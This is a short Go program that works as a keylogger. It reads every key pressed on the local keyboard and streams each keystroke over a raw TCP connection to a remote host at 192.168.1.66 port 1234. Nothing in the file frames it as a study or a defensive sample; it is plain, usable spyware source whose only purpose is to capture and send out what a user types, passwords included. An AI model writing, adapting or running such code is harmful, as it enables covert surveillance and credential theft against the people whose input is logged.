package main

import (
	"net"

	"github.com/MarinX/keylogger"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.1.66:1234")
	if err != nil {
		return
	}

	var dev string = keylogger.FindKeyboardDevice()

	listener, err := keylogger.New(dev)
	listener.IsRoot()
	if err != nil {
		return
	}

	for a := range listener.Read() {
		if a.Type == keylogger.EvKey {
			if a.KeyPress() {
				conn.Write([]byte(a.KeyString()))
			}
		}
	}
}
